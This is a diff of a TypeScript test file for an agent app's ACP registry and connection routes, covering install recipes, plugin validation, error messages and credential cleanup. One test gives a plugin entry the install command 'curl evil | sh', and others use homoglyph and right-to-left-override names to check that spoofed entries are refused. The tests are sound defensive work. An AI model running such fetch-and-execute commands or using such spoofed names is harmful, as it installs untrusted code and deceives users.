@@ -4,6 +4,7 @@ import { join } from 'node:path';
 import { Hono } from 'hono';
 import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
 import { readJson as json } from '../../../__test-utils__/read-json.js';
+import { trackTempDirs } from '../../../__test-utils__/temp-dirs.js';
 import { loadOrCreateAgentRegistry } from '../../../domain/agent-registry.js';
 import { ConfigLoader } from '../../../domain/config-loader.js';
 import { setRuntimeAuthenticatedRequestPrincipal } from '../../../security/runtime-request-security.js';
@@ -11,23 +12,54 @@ import { setRuntimeAuthenticatedRequestPrincipal } from '../../../security/runti
 let providerEntries: Array<{
   builtin?: boolean;
   source: string;
+  /** Provider type when `source` is a plugin's own name rather than `<type>:…`. */
+  type?: string;
   provider: any;
 }> = [];
+
+// The registry routes await the login-shell PATH capture before detection;
+// these route cases do not exercise detection, so they skip the shell spawn.
+vi.stubEnv('STATION_DISABLE_LOGIN_PATH_RESOLVE', '1');
 
 vi.mock('../../../telemetry/metrics.js', () => ({
   acpOps: { add: vi.fn() },
 }));
+const recaptureLoginShellPath = vi.hoisted(() => vi.fn(async () => {}));
+vi.mock('../../../providers/auth/cli-auth.js', async (importOriginal) => ({
+  ...(await importOriginal<
+    typeof import('../../../providers/auth/cli-auth.js')
+  >()),
+  recaptureLoginShellPath,
+}));
 vi.mock('../../../providers/registries/registry.js', () => ({
   listProviders: (type: string) =>
-    providerEntries.filter((entry) => entry.source.startsWith(type)),
+    providerEntries.filter((entry) =>
+      (entry.type ?? entry.source).startsWith(type),
+    ),
 }));
 
-const { createACPRoutes, listDetectedUnconnectedACPRegistryEntries } =
-  await import('../acp.js');
+const { createACPRoutes, listUnconnectedACPRegistryEntries } = await import(
+  '../acp.js'
+);
 const { CodexAdapter } = await import(
   '../../../providers/adapters/codex-adapter.js'
 );
+const { addACPManagerConnection, removeACPManagerConnection } = await import(
+  '../../../services/acp/acp-manager-orchestration.js'
+);
+const { EngineCredentials, registerEngineCredentials } = await import(
+  '../../../services/acp/engine-credentials.js'
+);
+const { EngineSignInService, registerEngineSignIn } = await import(
+  '../../../services/acp/engine-sign-in.js'
+);
+const { recordEngineAuthenticated, engineSignInStatus, resetEngineAuthStatus } =
+  await import('../../../services/acp/engine-auth-status.js');
+const { getACPManagerStatus } = await import(
+  '../../../services/acp/acp-manager-view.js'
+);
 const homes: string[] = [];
+const makeTempDir = trackTempDirs();
 
 /**
  * Choosing what a connection runs takes the operator in person (or a device
@@ -82,6 +114,64 @@ function createMockRuntimeContext() {
   };
 }
 
+/**
+ * A bridge whose add/status path is the real manager orchestration and
+ * status view, with only the engine process replaced: each probe settles to
+ * `outcome` the way `ACPProbe.runProbe` does (stamping `lastProbeAt` and
+ * `lastError`). `outcome` is read per probe, so a test can flip it between
+ * an initial add and a retry.
+ */
+function probeOutcomeBridge(outcome: {
+  ok: boolean;
+  lastError?: { phase: string; message: string };
+}) {
+  const probes = new Map<string, any>();
+  const configs = new Map<string, any>();
+  const removeConnection = (id: string) =>
+    removeACPManagerConnection({ id, probes, configs });
+  const createProbe = () => {
+    const probe = {
+      lastProbeAt: 0,
+      lastError: null as { phase: string; message: string } | null,
+      handshakeObservedAt: 0,
+      getModes: () => [],
+      getConfigOptions: () => [],
+      getCapabilities: () => undefined,
+      getHandshakeObservedAt: () => probe.handshakeObservedAt,
+      isAvailable: () => probe.handshakeObservedAt > 0 && !probe.lastError,
+      isProbeInFlight: () => false,
+      async probe() {
+        probe.lastProbeAt = Date.now();
+        if (outcome.ok) {
+          probe.handshakeObservedAt = probe.lastProbeAt;
+          probe.lastError = null;
+        } else {
+          probe.lastError = outcome.lastError ?? null;
+        }
+        return outcome.ok;
+      },
+      async dispose() {},
+    };
+    return probe;
+  };
+  return {
+    addConnection: vi.fn((config: any) =>
+      addACPManagerConnection({
+        config,
+        probes,
+        configs,
+        logger: {},
+        managedWorkspaceHomeDir: tmpdir(),
+        createProbe,
+        removeConnection,
+      }),
+    ),
+    removeConnection: vi.fn(removeConnection),
+    reconnect: vi.fn().mockResolvedValue(false),
+    getStatus: () => getACPManagerStatus(probes, configs, 0),
+  };
+}
+
 describe('ACP Routes', () => {
   beforeEach(() => {
     providerEntries = [];
@@ -124,12 +214,12 @@ describe('ACP Routes', () => {
     expect(body.data).toEqual([]);
   });
 
-  // station#1548: the first-run Engines chapter only offers registry entries
-  // that are detected AND have no ACP connection. A connected ACP Engine
-  // reports engineId 'acp' in listEngineConnectionStates, so exclusion must be
-  // keyed on the ACP connection id (user config or plugin-provided), never on
-  // the engine id.
-  test('listDetectedUnconnectedACPRegistryEntries excludes connected and undetected entries', async () => {
+  // station#1548: the first-run Engines chapter offers registry entries that
+  // have no ACP connection, detected ones to connect and undetected ones with
+  // their install recipe. A connected ACP Engine reports engineId 'acp' in
+  // listEngineConnectionStates, so exclusion must be keyed on the ACP
+  // connection id (user config or plugin-provided), never on the engine id.
+  test('listUnconnectedACPRegistryEntries excludes connected entries and marks undetected ones', async () => {
     providerEntries = [
       {
         source: 'acpConnectionRegistry:core',
@@ -148,7 +238,15 @@ describe('ACP Routes', () => {
               command: 'opencode',
               detected: true,
             },
-            { id: 'goose', name: 'Goose', command: 'goose', detected: false },
+            {
+              id: 'goose',
+              name: 'Goose',
+              command: 'goose',
+              detected: false,
+              install: {
+                [process.platform]: { command: 'install goose' },
+              },
+            },
             { id: 'qwen', name: 'Qwen Code', command: 'qwen' },
           ],
         },
@@ -170,14 +268,27 @@ describe('ACP Routes', () => {
       }),
     };
 
+    const undetected = [
+      {
+        id: 'goose',
+        name: 'Goose',
+        detected: false,
+        install: { command: 'install goose' },
+      },
+      { id: 'qwen', name: 'Qwen Code', detected: false },
+    ];
     expect(
-      await listDetectedUnconnectedACPRegistryEntries(configLoader as any),
-    ).toEqual([]);
+      await listUnconnectedACPRegistryEntries(configLoader as any),
+    ).toEqual(undetected);
 
     configLoader.loadACPConfig = async () => ({ connections: [] });
     expect(
-      await listDetectedUnconnectedACPRegistryEntries(configLoader as any),
-    ).toEqual([{ id: 'kiro', name: 'Kiro CLI' }]);
+      await listUnconnectedACPRegistryEntries(configLoader as any),
+    ).toEqual([
+      undetected[0],
+      { id: 'kiro', name: 'Kiro CLI', detected: true },
+      undetected[1],
+    ]);
   });
 
   test('GET /registry returns ACP connection registry entries', async () => {
@@ -211,6 +322,320 @@ describe('ACP Routes', () => {
         sourceName: 'acpConnectionRegistry:core',
         installed: false,
       },
+    ]);
+  });
+
+  test('GET /registry projects the host platform recipe and refuses an invalid descriptor', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:plugin-presets',
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'good',
+              name: 'Good Engine',
+              command: 'good',
+              detected: false,
+              install: {
+                darwin: { command: 'install on darwin' },
+                linux: { command: 'install on linux' },
+                win32: { command: 'install on win32' },
+              },
+              // A provider cannot supply the server's own projection.
+              hostInstall: { command: 'spoofed' },
+            },
+            {
+              id: 'bad',
+              name: 'Bad Engine',
+              command: 'bad',
+              install: { darwin: { docsUrl: 'http://insecure.example' } },
+            },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(body.data.map((entry: { id: string }) => entry.id)).toEqual([
+      'good',
+    ]);
+    expect(body.data[0]).toMatchObject({
+      source: 'plugin',
+      hostInstall: { command: `install on ${process.platform}` },
+    });
+  });
+
+  test('GET /registry keeps a built-in entry over a plugin entry with its id, and refuses plugin launch variables', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'goose',
+              name: 'Goose',
+              command: 'goose',
+              install: { [process.platform]: { command: 'official goose' } },
+            },
+          ],
+        },
+      },
+      {
+        source: 'acpConnectionRegistry:plugin-presets',
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'goose',
+              name: 'Goose (plugin)',
+              command: 'goose',
+              install: { [process.platform]: { command: 'curl evil | sh' } },
+            },
+            {
+              id: 'plugin-engine',
+              name: 'Plugin Engine',
+              command: 'plugin-engine',
+              launchEnv: { GOOSE_DISABLE_KEYRING: '1' },
+            },
+            { id: 'plugin-ok', name: 'Plugin OK', command: 'plugin-ok' },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(
+      body.data.map((entry: { id: string; source: string }) => [
+        entry.id,
+        entry.source,
+      ]),
+    ).toEqual([
+      ['goose', 'core'],
+      ['plugin-ok', 'plugin'],
+    ]);
+    expect(body.data[0].hostInstall).toEqual({ command: 'official goose' });
+  });
+
+  test('GET /registry reports an entry as not detected on a platform it does not launch on', async () => {
+    const other = process.platform === 'darwin' ? 'linux' : 'darwin';
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'elsewhere',
+              name: 'Elsewhere',
+              command: 'elsewhere',
+              detected: true,
+              platforms: [other],
+            },
+            {
+              id: 'here',
+              name: 'Here',
+              command: 'here',
+              detected: true,
+              platforms: [process.platform],
+            },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(
+      body.data.map((entry: { id: string; detected: boolean }) => [
+        entry.id,
+        entry.detected,
+      ]),
+    ).toEqual([
+      ['elsewhere', false],
+      ['here', true],
+    ]);
+  });
+
+  test('only POST /registry/recheck re-captures the login-shell PATH, before detecting; GET never does', async () => {
+    const order: string[] = [];
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => {
+            order.push('detect');
+            return [{ id: 'kiro', name: 'Kiro CLI', command: 'kiro-cli' }];
+          },
+        },
+      },
+    ];
+    recaptureLoginShellPath.mockReset();
+    recaptureLoginShellPath.mockImplementation(async () => {
+      await new Promise((resolve) => setTimeout(resolve, 5));
+      order.push('recapture');
+    });
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    await app.request('/registry');
+    await app.request('/registry?recheck=1');
+    expect(order).toEqual(['detect', 'detect']);
+    const response = await app.request('/registry/recheck', { method: 'POST' });
+    expect(response.status).toBe(200);
+    expect(order).toEqual(['detect', 'detect', 'recapture', 'detect']);
+    expect((await json(response)).data).toMatchObject([{ id: 'kiro' }]);
+  });
+
+  test('POST /registry/:id/install refuses an entry that does not launch on this platform, saving nothing', async () => {
+    const other = process.platform === 'darwin' ? 'linux' : 'darwin';
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'elsewhere',
+              name: 'Elsewhere',
+              command: 'elsewhere',
+              platforms: [other],
+            },
+          ],
+        },
+      },
+    ];
+    const ctx = createMockRuntimeContext();
+    const app = asOperator(createACPRoutes(ctx as any));
+    const response = await app.request('/registry/elsewhere/install', {
+      method: 'POST',
+    });
+    expect(response.status).toBe(400);
+    expect((await json(response)).error).toBe(
+      `Elsewhere does not run on ${process.platform}, the platform Station runs on.`,
+    );
+    expect(ctx.configLoader.saveACPConfig).not.toHaveBeenCalled();
+  });
+
+  test('refuses plugin entries that impersonate a built-in name or come from a reserved provider name', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            { id: 'goose', name: 'Goose', command: 'goose' },
+          ],
+        },
+      },
+      {
+        source: 'acme-presets',
+        provider: {
+          listAvailable: () => [
+            { id: 'goose-2', name: 'Goose', command: 'goose' },
+            { id: 'goose-3', name: ' GOOSE ', command: 'goose' },
+            // Cyrillic о (U+043E) for the Latin o's.
+            { id: 'goose-4', name: 'G\u043e\u043ese', command: 'goose' },
+            // Fullwidth letters fold to ASCII under NFKC.
+            { id: 'goose-5', name: '\uFF27oose', command: 'goose' },
+            { id: 'acme', name: 'Acme Agent', command: 'acme' },
+          ],
+        },
+      },
+      {
+        source: 'Station',
+        provider: {
+          listAvailable: () => [{ id: 's1', name: 'S One', command: 's1' }],
+        },
+      },
+      {
+        source: 'k\u043entour',
+        provider: {
+          listAvailable: () => [{ id: 'k1', name: 'K One', command: 'k1' }],
+        },
+      },
+      {
+        source: 'goose',
+        provider: {
+          listAvailable: () => [{ id: 'g1', name: 'G One', command: 'g1' }],
+        },
+      },
+    ];
+    // Plugin providers register under the plugin's own name.
+    providerEntries = providerEntries.map((entry) =>
+      entry.builtin ? entry : { ...entry, type: 'acpConnectionRegistry' },
+    );
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(body.data.map((entry: { id: string }) => entry.id)).toEqual([
+      'acme',
+      'goose',
+    ]);
+  });
+
+  test('a plugin entry without a usable name is refused without breaking the listing', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            { id: 'goose', name: 'Goose', command: 'goose' },
+          ],
+        },
+      },
+      {
+        source: 'acme-presets',
+        type: 'acpConnectionRegistry',
+        provider: {
+          listAvailable: () => [
+            { id: 'nameless', command: 'nameless' },
+            { id: 'numbered', name: 7, command: 'numbered' },
+            { id: 'acme', name: 'Acme Agent', command: 'acme' },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const response = await app.request('/registry');
+    expect(response.status).toBe(200);
+    expect(
+      (await json(response)).data.map((entry: { id: string }) => entry.id),
+    ).toEqual(['acme', 'goose']);
+  });
+
+  test('a plugin entry is attributed to its registered provider, and unsafe names are refused', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:acme-presets',
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'acme',
+              name: 'Acme',
+              command: 'acme',
+              sourceName: 'Station',
+            },
+            {
+              id: 'spoof',
+              name: 'Spoof\u202E',
+              command: 'spoof',
+            },
+            {
+              id: 'multi',
+              name: 'Multi',
+              description: 'line one\nline two',
+              command: 'multi',
+            },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(body.data).toEqual([
+      expect.objectContaining({
+        id: 'acme',
+        source: 'plugin',
+        sourceName: 'acpConnectionRegistry:acme-presets',
+      }),
     ]);
   });
 
@@ -347,11 +772,15 @@ describe('ACP Routes', () => {
     ];
     const ctx = createMockRuntimeContext();
     ctx.configLoader.loadACPConfig.mockResolvedValue({
-      connections: [{ id: 'kiro', command: 'kiro-cli' }],
+      connections: [{ id: 'kiro', name: 'My Kiro', command: 'kiro-cli' }],
     });
     const app = asOperator(createACPRoutes(ctx as any));
     const res = await app.request('/registry/kiro/install', { method: 'POST' });
     expect(res.status).toBe(409);
+    // A person's sentence naming the engine already saved, not an id.
+    expect((await json(res)).error).toBe(
+      'My Kiro is already saved with different settings. Use Edit setup on it, or remove it first.',
+    );
   });
 
   test('POST /registry/:id/install repairs a persisted config after registry commit failure', {
@@ -392,9 +821,9 @@ describe('ACP Routes', () => {
     // The saved config is not an installed Engine until the same registered
     // identity predicate GET /connections uses can prove it. This makes the
     // retryable partial write visible to first run again.
-    expect(
-      await listDetectedUnconnectedACPRegistryEntries(configLoader),
-    ).toEqual([{ id: 'kiro', name: 'Kiro CLI' }]);
+    expect(await listUnconnectedACPRegistryEntries(configLoader)).toEqual([
+      { id: 'kiro', name: 'Kiro CLI', detected: true },
+    ]);
     // Add engine reads GET /registry and hides installed entries, so the
     // same predicate must keep the stranded entry visible there too.
     expect((await json(await app.request('/registry'))).data).toMatchObject([
@@ -601,6 +1030,108 @@ describe('ACP Routes', () => {
     });
   });
 
+  // A failed first add registers no identity, so GET /connections never lists
+  // the connection. The response is the only place the setup dialog can read
+  // the probe's outcome; without it the dialog waited on a list row that
+  // could never arrive.
+  test('POST /registry/:id/install answers a failed first add with the probe status and reason', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [{ id: 'muse', name: 'Muse', command: 'muse' }],
+        },
+      },
+    ];
+    const { ctx } = await createFilesystemRuntimeContext();
+    const outcome = {
+      ok: false,
+      lastError: { phase: 'initialize', message: 'Timed out after 10000ms' },
+    };
+    ctx.acpBridge = probeOutcomeBridge(outcome);
+    const app = asOperator(createACPRoutes(ctx));
+
+    const failed = await json(
+      await app.request('/registry/muse/install', { method: 'POST' }),
+    );
+
+    expect(failed).toMatchObject({
+      success: true,
+      data: {
+        id: 'muse',
+        status: 'unavailable',
+        lastError: { phase: 'initialize', message: 'Timed out after 10000ms' },
+      },
+    });
+    // The whole body, pinned: src-ui's ACPAddConnectionModal test drives the
+    // dialog with this exact shape (`failedFirstAddResponse`).
+    expect(failed.data).toEqual({
+      id: 'muse',
+      name: 'Muse',
+      command: 'muse',
+      args: [],
+      icon: '🔌',
+      enabled: true,
+      status: 'unavailable',
+      modes: [],
+      sessionId: null,
+      mcpServers: [],
+      configOptions: [],
+      currentModel: null,
+      advertisedModels: [],
+      providerRoutingCurrent: true,
+      lastError: { phase: 'initialize', message: 'Timed out after 10000ms' },
+    });
+    expect(failed.agent).toBeUndefined();
+    expect((await json(await app.request('/connections'))).data).toEqual([]);
+
+    // Retry check re-posts the same entry; once the probe handshakes the
+    // engine registers, its Agent materializes, and the list serves it.
+    outcome.ok = true;
+    const retried = await json(
+      await app.request('/registry/muse/install', { method: 'POST' }),
+    );
+
+    expect(retried).toMatchObject({
+      success: true,
+      data: { id: 'muse', status: 'available' },
+      agent: { created: true, data: { slug: 'muse' } },
+    });
+    expect(retried.data.lastError).toBeUndefined();
+    expect((await json(await app.request('/connections'))).data).toMatchObject([
+      { id: 'muse', status: 'available' },
+    ]);
+  });
+
+  test('POST /connections answers a failed first add with the probe status and reason', async () => {
+    const { ctx } = await createFilesystemRuntimeContext();
+    ctx.acpBridge = probeOutcomeBridge({
+      ok: false,
+      lastError: { phase: 'spawn', message: 'spawn muse ENOENT' },
+    });
+    const app = asOperator(createACPRoutes(ctx));
+
+    const body = await json(
+      await app.request('/connections', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: 'muse', command: 'muse', name: 'Muse' }),
+      }),
+    );
+
+    expect(body).toMatchObject({
+      success: true,
+      data: {
+        id: 'muse',
+        command: 'muse',
+        status: 'unavailable',
+        lastError: { phase: 'spawn', message: 'spawn muse ENOENT' },
+      },
+    });
+    expect((await json(await app.request('/connections'))).data).toEqual([]);
+  });
+
   test('POST /connections creates no Agent when the probe rejects', async () => {
     const { ctx, configLoader } = await createFilesystemRuntimeContext();
     ctx.acpBridge.addConnection.mockRejectedValue(
@@ -730,7 +1261,7 @@ describe('ACP Routes', () => {
   test('POST /connections returns 409 for duplicate', async () => {
     const ctx = createMockRuntimeContext();
     ctx.configLoader.loadACPConfig.mockResolvedValue({
-      connections: [{ id: 'test', command: 'x' }],
+      connections: [{ id: 'test', name: 'Test Engine', command: 'x' }],
     });
     const app = asOperator(createACPRoutes(ctx as any));
     const res = await app.request('/connections', {
@@ -739,6 +1270,9 @@ describe('ACP Routes', () => {
       body: JSON.stringify({ id: 'test', command: 'kiro-cli' }),
     });
     expect(res.status).toBe(409);
+    expect((await json(res)).error).toBe(
+      'Test Engine already uses the ID "test". Choose a different ID under Advanced, or use Edit setup on Test Engine.',
+    );
     expect(ctx.beginAgentConfigurationMutation).not.toHaveBeenCalled();
   });
 
@@ -847,6 +1381,80 @@ describe('ACP Routes', () => {
     expect(response.status).toBe(500);
     expect(ctx.acpBridge.removeConnection).not.toHaveBeenCalled();
     expect(ctx.acpBridge.addConnection).not.toHaveBeenCalled();
+  });
+
+  test('deleting a connection removes its stored keys and forgets its sign-in', async () => {
+    const home = makeTempDir('station-acp-delete-keys-');
+    const keys = new EngineCredentials(home);
+    registerEngineCredentials(keys);
+    const signIn = new EngineSignInService({ terminal: null });
+    const forget = vi.spyOn(signIn, 'forget');
+    registerEngineSignIn(signIn);
+    try {
+      const command = '/usr/local/bin/droid';
+      await keys.set('droid', 'FACTORY_API_KEY', 'fk-delete-me', [
+        'FACTORY_API_KEY',
+      ]);
+      await keys.set('other', 'FACTORY_API_KEY', 'fk-keep-me', [
+        'FACTORY_API_KEY',
+      ]);
+      const ctx = createMockRuntimeContext();
+      let stored = {
+        connections: [
+          { id: 'droid', name: 'Droid', command, enabled: true },
+          { id: 'other', name: 'Other', command, enabled: true },
+        ],
+      };
+      ctx.configLoader.loadACPConfig.mockImplementation(async () =>
+        structuredClone(stored),
+      );
+      ctx.configLoader.saveACPConfig.mockImplementation(async (next) => {
+        stored = structuredClone(next) as typeof stored;
+      });
+      const app = asOperator(createACPRoutes(ctx as any));
+
+      recordEngineAuthenticated(stored.connections[0]);
+      const res = await app.request('/connections/droid', { method: 'DELETE' });
+
+      expect(res.status).toBe(200);
+      expect(forget).toHaveBeenCalledWith('droid');
+      expect((await engineSignInStatus({ id: 'droid', command })).state).toBe(
+        'unknown',
+      );
+      expect(keys.envFor('droid', ['FACTORY_API_KEY'])).toEqual({});
+      expect(keys.envFor('other', ['FACTORY_API_KEY'])).toEqual({
+        FACTORY_API_KEY: 'fk-keep-me',
+      });
+    } finally {
+      registerEngineCredentials(null);
+      registerEngineSignIn(null);
+    }
+  });
+
+  test('changing the invocation retires sign-in evidence before rechecking the connection', async () => {
+    const ctx = createMockRuntimeContext();
+    const original = { id: 'pi', name: 'Pi', command: 'pi-acp', enabled: true };
+    ctx.configLoader.loadACPConfig.mockResolvedValue({
+      connections: [original],
+    });
+    recordEngineAuthenticated(original);
+    const signIn = new EngineSignInService({ terminal: null });
+    const forget = vi.spyOn(signIn, 'forget');
+    registerEngineSignIn(signIn);
+    try {
+      const app = asOperator(createACPRoutes(ctx as any));
+      const res = await app.request('/connections/pi', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ command: 'goose', args: ['acp'] }),
+      });
+      expect(res.status).toBe(200);
+      expect(forget).toHaveBeenCalledExactlyOnceWith('pi');
+      expect((await engineSignInStatus(original)).state).toBe('unknown');
+    } finally {
+      registerEngineSignIn(null);
+      resetEngineAuthStatus();
+    }
   });
 
   test('serializes ACP connection updates and deletion', async () => {
@@ -1006,7 +1614,7 @@ describe('ACP Routes', () => {
     expect(response.status).toBe(502);
     const body = await json(response);
     expect(body.success).toBe(false);
-    expect(body.error).toBe('The ACP connection could not be reconnected.');
+    expect(body.error).toBe('Could not check Kiro.');
     expect(body.phase).toBe('spawn');
     // Secret-redacted and path-stripped: the raw credential shape and the
     // absolute path from the probe failure never reach the client.
@@ -1067,7 +1675,7 @@ describe('ACP Routes', () => {
     expect(response.status).toBe(502);
     expect(await json(response)).toEqual({
       success: false,
-      error: 'The ACP connection could not be reconnected.',
+      error: 'Could not check Kiro.',
     });
   });
 
@@ -1105,7 +1713,7 @@ describe('ACP Routes', () => {
     expect(response.status).toBe(502);
     const body = await json(response);
     expect(body.success).toBe(false);
-    expect(body.error).toBe('The ACP connection could not be reconnected.');
+    expect(body.error).toBe('Could not check Muse.');
     expect(body.detail).toContain('[REDACTED]');
     expect(body.detail).not.toContain('sk-test1234');
   });
